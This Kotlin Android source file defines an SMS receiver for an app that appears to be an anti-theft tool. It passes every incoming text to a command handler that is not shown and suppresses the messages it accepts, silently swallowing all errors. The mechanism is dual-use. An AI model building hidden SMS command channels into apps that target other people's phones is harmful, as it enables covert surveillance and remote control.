package com.antimaling.permanen.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import com.antimaling.permanen.control.CommandHandler

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent?) {
        try {
            if (i?.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
            val msgs = try { Telephony.Sms.Intents.getMessagesFromIntent(i) } catch (_: Exception) { return }
            if (msgs.isNullOrEmpty()) return
            val sender = try { msgs[0].originatingAddress } catch (_: Exception) { null }
            val body = try { msgs.joinToString("") { it.messageBody ?: "" } } catch (_: Exception) { "" }
            if (body.isBlank()) return
            val handled = try { CommandHandler.handleSms(c, sender, body) } catch (_: Exception) { false }
            if (handled) try { abortBroadcast() } catch (_: Exception) {}
        } catch (_: Exception) {}
    }
}
